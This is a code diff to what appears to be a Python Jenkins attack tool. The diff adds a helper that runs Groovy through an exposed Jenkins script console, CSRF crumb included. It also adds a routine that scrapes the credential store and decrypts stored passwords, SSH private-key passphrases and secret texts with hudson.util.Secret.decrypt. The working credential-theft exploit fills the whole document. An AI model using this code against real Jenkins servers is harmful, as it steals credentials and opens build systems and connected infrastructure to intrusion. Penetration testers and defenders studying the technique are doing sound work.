@@ -3,7 +3,6 @@
 import requests
 import jenkins
 import urllib3
-import urllib
 from bs4 import BeautifulSoup
 import re
 
@@ -54,64 +53,97 @@ def check_cli_rmi_deserialization(target):
 def check_new_job(target):
     pass
 
-def check_credential_recovery(target):
-    if 'script_console' in target['vulns']:
+def script_interface(url, script):
+    with requests.Session() as s:
+        res = s.get(url + 'script')
+        headers = {'content-type': 'application/x-www-form-urlencoded'}
+        match = re.search(r'crumb\.init\("Jenkins-Crumb", "([0-9a-f]+)"\)', res.text)
+        if match:
+            csrf_token = match.group(1)
+            data = {
+                'script': script,
+                'Jenkins-Crumb': csrf_token,
+                'Submit': 'Run'
+            }
+        else:
+            data = {
+                'script': script,
+                'Submit': 'Run'
+            }
+
+        res = s.post(url + 'script', headers=headers, data=data)
+        soup = BeautifulSoup(res.text, 'html.parser')
+        return soup.body.findAll('pre')[1].text.replace('Result: ', '')
+
+def credential_recovery(target):
+    creds = {}
+    if 'script_console' in target['vulns'] and target['vulns']['script_console']:
         if target['url'].endswith('/'):
             url = target['url']
         else:
             url = target['url'] + '/'
-        res = requests.get(url + 'credential-store/domain/_/')
+        cred_store_url = ''
+        cred_store_urls = [
+            'credential-store/domain/_/',
+            'credentials/store/system/domain/_/'
+        ]
+        for u in cred_store_urls:
+            res = requests.get(url + u)
+            if res.status_code == 200:
+                cred_store_url = u
+        if not cred_store_url:
+            print 'Could not locate credential store URL'
+            return creds
+
         soup = BeautifulSoup(res.text, 'html.parser')
 
-        # loop to go through all hrefs and match the regex "credential" and add the urls to the users list
-        users = []
+        credentials = []
         for link in soup.body.findAll('a', href=True):
             if link['href'].startswith('credential/'):
-                if link['href'] not in users:
-                    users.append(link['href'])
+                credential = link['href'].split('/')[1]
+                if credential not in credentials:
+                    credentials.append(credential)
 
-        for user in users:
-            res = requests.get(url + 'credential-store/domain/_/' + user + '/update')
-            if res.status_code != 200 or '_.username' not in res.text:
+        for credential in credentials:
+            res = requests.get(url + cred_store_url + 'credential/' + credential + '/update')
+            if res.status_code != 200:
                 continue
             soup = BeautifulSoup(res.text, 'html.parser')
 
-            # Finds the user and password value in html and stores in encPass variable
-            username = soup.body.findAll(attrs={'name': '_.username'})[0]['value']
-            if re.search(r'_\.password', res.text):
-                e_pass = soup.body.findAll(attrs={ 'name': '_.password'})[0]['value']
-                # Encodes the password to www-form-urlencoded standards needed for the expected content type
-                epass_encoded = urllib.quote(e_pass, safe='')
+            if re.search(r'_\.username', res.text) and re.search(r'_\.password', res.text):
+                username = soup.body.findAll(attrs={'name': '_.username'})[0]['value']
+                e_pass = soup.body.findAll(attrs={'name': '_.password'})[0]['value']
+                
+                script = 'hudson.util.Secret.decrypt \'%s\'' % e_pass
+                password = script_interface(url, script).strip()
 
-                # Script to run in groovy scripting engine to decrypt the password
-                script = 'script=hudson.util.Secret.decrypt+%%27' \
-                         '%s'\
-                         '%%27&json=%%7B%%22script%%22%%3A+%%22hudson.util.Secret.decrypt+%%27' \
-                         '%s' \
-                         '%%27%%22%%2C+%%22%%22%%3A+%%22%%22%%7D&Submit=Run' % (epass_encoded, epass_encoded)
+                creds.update({credential: {'type': 'password', 'username': username, 'password': password}})
 
-                # Using sessions because the POST requires a session token to be present
-                with requests.Session() as s:
-                    r = s.get(url + 'script')
-                    headers = {'content-type': 'application/x-www-form-urlencoded'}
-                    r = s.post(url + 'script', data=script, headers=headers)
+            elif re.search(r'_\.passphrase', res.text) and re.search(r'_\.privateKey', res.text):
+                e_passphrase = soup.body.findAll(attrs={'name': '_.passphrase'})[0]['value'].strip()
+                private_key = soup.body.findAll(attrs={'name': '_.privateKey'})[0].contents[0].strip()
 
-                soup = BeautifulSoup(r.text, 'html.parser')
+                script = 'hudson.util.Secret.decrypt \'%s\'' % e_passphrase
+                passphrase = script_interface(url, script)
 
-                # Extracts password from body
-                password = soup.body.findAll('pre')[1].text
-                password = re.sub('Result:', '', password)
-                print 'User: %s | Password: %s' % (username, password.strip())
-        return {}
-    else:
-        return {}
+                creds.update({credential: {'type': 'private_key', 'key': private_key, 'passphrase': passphrase}})
+
+            elif re.search(r'_\.secret', res.text):
+                e_secret = soup.body.findAll(attrs={'name': '_.secret'})[0]['value'].strip()
+                script = 'hudson.util.Secret.decrypt \'%s\'' % e_secret
+                secret = script_interface(url, script)
+
+                creds.update({credential: {'type': 'secret', 'secret': secret}})
+
+    return creds
 
 def assess(target):
     target['vulns'] = {}
     target['vulns'].update(check_script_console(target))
     #target['vulns'].update(check_cli_rmi_deserialization(target))
     #target['vulns'].update(check_new_job(target))
-    target['vulns'].update(check_credential_recovery(target))
+    target['creds'] = {}
+    target['creds'].update(credential_recovery(target))
     return target
 
 def exploit(target):
